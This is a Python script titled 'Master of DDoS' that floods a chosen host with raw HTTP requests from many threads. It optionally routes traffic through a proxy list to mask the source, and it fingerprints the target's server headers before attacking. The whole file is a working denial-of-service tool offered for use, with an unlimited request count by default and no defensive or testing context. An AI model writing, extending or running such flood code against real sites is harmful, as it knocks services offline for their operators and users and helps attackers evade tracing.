#!/usr/bin/env python3
# -*- coding: utf-8 -*-

####################################

#   /$$      /$$           /$$$$$$$ 
#  | $$$    /$$$          | $$__  $$
#  | $$$$  /$$$$  /$$$$$$ | $$  \ $$
#  | $$ $$/$$ $$ /$$__  $$| $$  | $$
#  | $$  $$$| $$| $$  \ $$| $$  | $$
#  | $$\  $ | $$| $$  | $$| $$  | $$
#  | $$ \/  | $$|  $$$$$$/| $$$$$$$/
#  |__/     |__/ \______/ |_______/ 
#
#  Master of DDoS | Made by N0NL0C4L

#####################################

# Import required libraries
import os
import sys
import time
import socks
import socket
import random
import argparse
import warnings

from threading import Thread
from colorama import init
from colorama import Fore
from fake_useragent import UserAgent
from urllib.error import HTTPError
from urllib.parse import urlparse
from urllib.request import urlopen
from urllib.request import Request
from multiprocessing.dummy import Pool

# Clear console function
def clear_console():
    os.system('clear' if os.name == 'posix' else 'cls')

# Print banner function
def print_banner():
    print()
    print(f'{Fore.LIGHTCYAN_EX}  /$$      /$$           /$$$$$$$ ')
    print(f'{Fore.LIGHTCYAN_EX} | $$$    /$$$          | $$__  $$')
    print(f'{Fore.LIGHTCYAN_EX} | $$$$  /$$$$  /$$$$$$ | $$  \\ $$')
    print(f'{Fore.LIGHTCYAN_EX} | $$ $$/$$ $$ /$$__  $$| $$  | $$')
    print(f'{Fore.LIGHTCYAN_EX} | $$  $$$| $$| $$  \\ $$| $$  | $$')
    print(f'{Fore.LIGHTCYAN_EX} | $$\\  $ | $$| $$  | $$| $$  | $$')
    print(f'{Fore.LIGHTCYAN_EX} | $$ \\/  | $$|  $$$$$$/| $$$$$$$/')
    print(f'{Fore.LIGHTCYAN_EX} |__/     |__/ \\______/ |_______/ ')
    print()
    print(f'{Fore.LIGHTYELLOW_EX} Master of DDoS | Made by N0NL0C4L')

# Print flood info function
def flood_info():
    global amount, total_requests
    # Create a loop to print request info
    while amount > total_requests: 
        print(f'{Fore.LIGHTYELLOW_EX}Flooding      : {Fore.RESET}{total_requests}/{amount}', end='\r')

    # When the loop is finished print last info and exit 
    print(f'{Fore.LIGHTYELLOW_EX}Flooding      : {Fore.RESET}{total_requests}/{amount}')
    exit(0)

# url convert function
def convert_url(host):
    # If url has a scheme return current host
    if host.startswith('https://') or host.startswith('http://'):
        return host
    # Find best scheme for the url and return it
    else:
        # Return the url with http scheme
        return f'http://{host}'

# Get host info function
def get_host_info(host):
    # Create a request to get the server and access required infos from it's headers
    fake_headers = {'UserAgent': UserAgent().random}
    request = Request(host.geturl(), headers=fake_headers)

    # Get required host infos
    host_ip       = socket.gethostbyname(host.netloc)
    # Try to connect target host
    try:
        start_time = time.time()
        response   = urlopen(request)
    except HTTPError: 
        delay = round((time.time() - start_time) * 1000)
        return host_ip, 'unknown', delay, 'unknown', 'unknown'
    else:
        delay         = round((time.time() - start_time) * 1000)
        server        = response.headers.get('Server', 'unknown')
        cache_control = response.headers.get('Cache-Control', 'unknown')
        cf_ray        = response.headers.get('CF-RAY', 'no')

        # Return host infos
        return host_ip, server, delay, cf_ray, cache_control

# Proxy attack function
def proxy_attack(proxy):
    global host, port, amount, method, proxies, proxy_type, total_requests
    
    # Define the proxy
    proxy_host, proxy_port = proxy.split(':') if proxy.__contains__(':') else (proxy, 80)
    proxy_port = int(proxy_port)

    # Create a random UserAgent
    useragent = UserAgent().random

    # Create data to be sent
    data = f'{method} / HTTP/1.1\r\nHost: {host.netloc}\r\nUserAgent: {useragent}\r\n'.encode('ascii')
    # Create socket and try to connect target server
    sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    sock.set_proxy(proxy_type, proxy_host, proxy_port)
    try:
        sock.connect((host.netloc, port))
        sock.connect_ex((host.netloc, port))
        sock.setblocking(False)
    except Exception as e:
        # Restart proxy_attack function with random proxy
        proxy_attack(random.choice(proxies))
        return False
    # Create a loop and start sending packages to target server
    while amount > total_requests:
        try:
            sock.sendall(data)
        except Exception as e:
            # Restart proxy_attack function with random proxy
            proxy_attack(random.choice(proxies))
            return False
        else:
            # Increment total requests by one
            total_requests += 1

# Attack function
def attack():
    global host, port, amount, method, total_requests
    
    # Create a random UserAgent
    useragent = UserAgent().random
    # Create data to be sent
    data = f'{method} / HTTP/1.1\r\nHost: {host.netloc}\r\nUserAgent: {useragent}\r\n'.encode('ascii')
    # Create socket and connect target server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host.netloc, port))
    sock.connect_ex((host.netloc, port))
    sock.setblocking(False)
    # Create a loop and start sending packages to target server
    while amount > total_requests:
        try:
            sock.sendall(data)
        except Exception as e:
            # Close the socket and reconnect target server
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host.netloc, port))
            sock.connect_ex((host.netloc, port))
        else:
            # Increment total requests by one
            total_requests += 1

# Check if this script is imported by another script
if __name__ == '__main__':
    # Initalize colorama
    init(autoreset=True, convert=False)

    # Disable warnings
    warnings.simplefilter("ignore")

    # Check current Python version
    _version = int(sys.version[0])
    if _version > 3:
        exit(f'{Fore.RED}You are using an old Python version. Please update your Python version and try again!')

    # Create an argparser
    parser = argparse.ArgumentParser()

    # Add arguments
    parser.add_argument('--host',          type=str, required=True,        help='target host')
    parser.add_argument('-p', '--port',          type=int, default=80,           help='target port [default 80]')
    parser.add_argument('-t', '--thread',        type=int, default=100,          help='thread amount [default 100]')
    parser.add_argument('-a', '--amount',        type=int, default=float('inf'), help='request amount [default infinity]')
    parser.add_argument('-m', '--method',        type=str, default='GET',        help='request method [default GET]')
    parser.add_argument('-pl', '--proxy-list',    type=str, help='proxy list file')
    parser.add_argument('-pt', '--proxy-type',    type=str, default='HTTP' ,help='proxy type [default HTTP]')

    # Parse args
    args   = parser.parse_args()
    host   = args.host
    url    = convert_url(host)
    host   = urlparse(url)
    port   = args.port
    thread = args.thread
    amount = args.amount
    method = args.method
    proxy_list    = args.proxy_list
    proxy_type    = getattr(socks, args.proxy_type)

    # Define required vars
    total_requests    = 0
    proxy_list_isfile = os.path.isfile(str(proxy_list))

    # Clear console and print banner
    clear_console()
    print_banner()

    # Get host infos
    host_ip, server, delay, cf_ray, cache_control = get_host_info(host)

    # Print target server info
    print(f'{Fore.LIGHTGREEN_EX}-----------------------------------')
    print(f'{Fore.LIGHTYELLOW_EX}Host          : {Fore.RESET}{host.geturl()}')
    print(f'{Fore.LIGHTYELLOW_EX}Host IP       : {Fore.RESET}{host_ip}')
    print(f'{Fore.LIGHTYELLOW_EX}Port          : {Fore.RESET}{port}')
    print(f'{Fore.LIGHTYELLOW_EX}Server        : {Fore.RESET}{server}')
    print(f'{Fore.LIGHTYELLOW_EX}Delay         : {Fore.RESET}{delay}ms')
    print(f'{Fore.LIGHTYELLOW_EX}CF-RAY        : {Fore.RESET}{cf_ray}')
    print(f'{Fore.LIGHTYELLOW_EX}Cache-Control : {Fore.RESET}{cache_control}')
    print()
    print(f'{Fore.LIGHTGREEN_EX}-----------------------------------')
    print(f'{Fore.LIGHTYELLOW_EX}Thread amount : {Fore.RESET}{thread}')

    if proxy_list is not None and os.path.isfile(proxy_list):
        print(f'{Fore.LIGHTYELLOW_EX}Proxy list    : {Fore.RESET}{proxy_list}')
        print(f'{Fore.LIGHTYELLOW_EX}Proxy type    : {Fore.RESET}{args.proxy_type}')

    print(f'{Fore.LIGHTYELLOW_EX}Method        : {Fore.RESET}{method}')

    # Create threads
    thr = Thread(target=flood_info, args=(), daemon=False)
    thr.start()

    if proxy_list_isfile:
        # Define the thread types
        thread = int(thread / 2)

        # Create threads
        for i in range(thread):
            thr = Thread(target=attack, args=(), daemon=False)
            thr.start()

        # Read the proxy file
        proxy_file = open(proxy_list, 'r', encoding='utf-8')
        proxies    = proxy_file.readlines()
        proxy_file.close()

        # Create pool
        p = Pool(thread)
        p.map(proxy_attack, proxies)

    else:
        # Create threads with a loop
        for i in range(thread):
            thr = Thread(target=attack, args=(), daemon=False)
            thr.start()
